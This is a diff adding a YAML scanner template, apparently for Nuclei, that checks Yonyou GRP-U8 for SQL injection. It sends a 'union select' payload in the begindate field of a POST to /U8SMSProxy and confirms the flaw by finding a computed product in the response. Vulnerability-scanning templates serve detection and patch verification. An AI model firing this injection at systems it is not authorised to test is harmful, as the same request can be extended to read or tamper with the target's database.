@@ -1,0 +1,44 @@
+id: poc-yaml-yongyou-grp-u8-begindate-sqli
+info:
+  name: 用友GRP-U8 begindate SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+  description: |
+    用友GRP-U8 begindate SQL injection vulnerability
+
+variables:
+  t1: "{{rand_int(100, 10000)}}"
+  t2: "{{rand_int(100, 10000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
+
+http:
+  - raw:
+      - |
+        POST /U8SMSProxy?class=XXNote&id=qryyfs HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        begindate='union select {{t1}}*{{t2}}--&enddate=2020-10-27&search=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"total":'
+      - type: word
+        part: body
+        words:
+          - '{{t3}}'
+      - type: word
+        part: content-type
+        words:
+          - "application/x-json"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
